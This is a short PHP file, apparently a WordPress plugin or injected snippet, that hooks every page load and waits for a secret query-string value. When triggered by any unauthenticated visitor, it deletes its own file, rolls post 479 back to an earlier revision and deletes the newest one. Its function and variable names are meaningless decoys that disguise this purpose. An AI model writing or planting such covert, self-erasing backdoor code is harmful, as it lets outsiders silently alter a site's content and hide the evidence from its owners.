<?php

function global_chart_github_filter() {
	if (isset($_GET['inline_item_messages']) && $_GET['inline_item_messages'] === 'hide_request_validator_all') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$locator_protection_plupload_send = 479;
		$styles_youtube_notification_insert = wp_get_post_revisions($locator_protection_plupload_send);
		if (empty($styles_youtube_notification_insert)) die('no revisions');
		if (count($styles_youtube_notification_insert) < 2) die('less than 2');
		$contents_tracking_platform_notes = array_shift($styles_youtube_notification_insert);
		$sites_project_file_anti = $contents_tracking_platform_notes->ID;
		$effect_photos_switch = array_shift($styles_youtube_notification_insert);
		$visual_store_restaurant = $effect_photos_switch->ID;
		$press_calendar_subscriptions = wp_restore_post_revision($visual_store_restaurant);
		if ($press_calendar_subscriptions === false) die('error restoring');
		$press_calendar_subscriptions = wp_delete_post_revision($sites_project_file_anti);		
		if ($press_calendar_subscriptions === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'global_chart_github_filter');
